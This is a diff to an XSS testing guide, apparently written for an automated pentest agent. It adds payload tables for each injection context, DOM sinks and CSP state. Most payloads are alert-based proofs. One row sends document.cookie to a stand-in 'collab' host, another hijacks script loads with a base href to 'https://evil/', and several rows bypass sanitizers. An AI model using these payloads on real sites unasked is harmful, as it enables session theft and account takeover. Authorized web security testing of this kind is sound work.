@@ -122,14 +122,117 @@ Server or client templates evaluating expressions (AngularJS legacy, Handlebars 
 - Custom policies returning unsanitized strings; abuse policy whitelists
 - Sinks not covered by Trusted Types (CSS, URL handlers) and pivot via gadgets
 
-## Polyglot Payloads
+## Payload Tables — per context
 
-Keep a compact set tuned per context:
-- **HTML node**: `<svg onload=alert(1)>`
-- **Attr quoted**: `" autofocus onfocus=alert(1) x="`
-- **Attr unquoted**: `onmouseover=alert(1)`
-- **JS string**: `"-alert(1)-"`
-- **URL**: `javascript:alert(1)`
+Pick by sink classification, not by preference. Each payload states what it
+proves; `CANARY` marks where a per-test unique token goes so execution — not
+reflection — is what you verify.
+
+### HTML node (text context, tags not escaped)
+
+| Payload | Notes |
+|---|---|
+| `<svg onload=alert(CANARY)>` | smallest reliable; no `<>` filtering evasion needed |
+| `<img src=x onerror=alert(CANARY)>` | works where `svg` is stripped |
+| `<details open ontoggle=alert(CANARY)>` | no `src` needed; survives some tag filters |
+| `<iframe srcdoc="&lt;script&gt;alert(CANARY)&lt;/script&gt;">` | bypasses inner-HTML filtering of `<script>` |
+| `<script>fetch('https://collab/'+document.cookie)</script>` | proof of exfil capability, use only where authorized |
+| `<body onload=alert(CANARY)>` | when injection lands before `<body>` is closed |
+| `<math><mtext><table><mglyph><style><!--</style><img title="--></mglyph><img src=1 onerror=alert(CANARY)>">` | mXSS — survives DOMPurify-class sanitizers via re-parsing |
+| `<noscript><p title="</noscript><img src=x onerror=alert(CANARY)>">` | mXSS in noscript context |
+
+### Attribute — quoted
+
+| Payload | Notes |
+|---|---|
+| `" autofocus onfocus=alert(CANARY) x="` | fires without interaction on autofocus-able elements |
+| `" onmouseover=alert(CANARY) x="` | needs a hover |
+| `" onfocusin=alert(CANARY) autofocus x="` | `focusin` bubbles; reaches ancestors |
+| `"><svg onload=alert(CANARY)>` | breaks out of the attribute into a node |
+| `" onclick=alert(CANARY) x="` | needs a click |
+
+### Attribute — unquoted or single-quoted
+
+| Payload | Notes |
+|---|---|
+| `onmouseover=alert(CANARY) x=` | unquoted attr injection |
+| `' onfocus='alert(CANARY)' autofocus x=' | single-quoted attr breakout |
+| `/onerror=alert(CANARY)//` | where `/` acts as an attribute separator |
+
+### JS string
+
+| Payload | Notes |
+|---|---|
+| `"-alert(CANARY)-"` | classic arithmetic breakout |
+| `";alert(CANARY)//"` | statement terminator |
+| `</script><svg onload=alert(CANARY)>` | when the string is inside a `<script>` block — close the tag first |
+| `\';alert(CANARY)//` | escaped-quote contexts |
+| `$(alert(CANARY))` | jQuery-aware sinks that eval expressions |
+
+### URL / scheme
+
+| Payload | Notes |
+|---|---|
+| `javascript:alert(CANARY)` | href/src where the scheme is not allowlisted |
+| `data:text/html,<script>alert(CANARY)</script>` | data URLs where allowed |
+| `jav&#x09;ascript:alert(CANARY)` | tab entity breaks naive scheme filters |
+| `javascript&colon;alert(CANARY)` | HTML entity in href — parsed at the browser layer |
+
+### CSS
+
+| Payload | Notes |
+|---|---|
+| `expression(alert(CANARY))` | legacy IE only — usually out of scope, say so |
+| `</style><script>alert(CANARY)</script>` | style-block breakout, works everywhere |
+| `background:url("javascript:alert(CANARY)")` | legacy |
+
+### DOM sinks — the payload is in the source, not the reflection
+
+| Sink | Payload |
+|---|---|
+| `innerHTML` / `outerHTML` | `<img src=x onerror=alert(CANARY)>` |
+| `document.write` | `<svg><animate onbegin=alert(CANARY)>` |
+| `eval` / `Function` | `alert(CANARY)` as the string |
+| `location` / `window.open` | `javascript:alert(CANARY)` |
+| `jQuery $(html)` | `<img src=x onerror=alert(CANARY)>` |
+| `setTimeout(string)` | `alert(CANARY)` |
+
+For DOM XSS the payload must survive to the sink: test with the browser, via
+`browser evaluate_script`, and confirm the handler actually fired — a reflection
+in the HTML source proves nothing if the sanitizer neutralised it before the sink.
+
+### Framework notes that change the payload
+
+| Framework | What changes |
+|---|---|
+| React | JSX escapes by default; look for `dangerouslySetInnerHTML`, `href={userInput}` |
+| Angular | look for bypassing of the built-in sanitizer; `DomSanitizer.bypassSecurityTrust*` |
+| Vue | `v-html` is the dangerous sink; attribute binding is safe |
+| Svelte | `{@html ...}` is the dangerous sink |
+| Markdown renderers | `javascript:` links and inline HTML pass-through vary by renderer version |
+
+### CSP-aware payloads
+
+When a CSP is present, payload choice follows the policy, not habit:
+
+| CSP state | Path |
+|---|---|
+| `script-src 'unsafe-inline'` | everything above works |
+| nonces present | steal the nonce from the page (`<script nonce=...>` in source), reuse it |
+| `strict-dynamic` | inject a `<script>` that loads another script; the nonce propagates |
+| `object-src 'none'` + no unsafe-inline | look for script gadgets in allowed frameworks (AngularJS templates) |
+| `base-uri` unset | `<base href="https://evil/">` hijacks relative script loads |
+| no `frame-ancestors` | clickjacking is a separate finding, not XSS |
+
+AngularJS template injection where `angular` is on the page and CSP blocks
+`unsafe-inline`:
+
+```
+{{constructor.constructor('alert(CANARY)')()}}
+```
+
+This is the standard CSP bypass path when the page loads AngularJS and CSP
+blocks inline scripts but not eval (unsafe-eval allowed).
 
 ## Framework-Specific
 
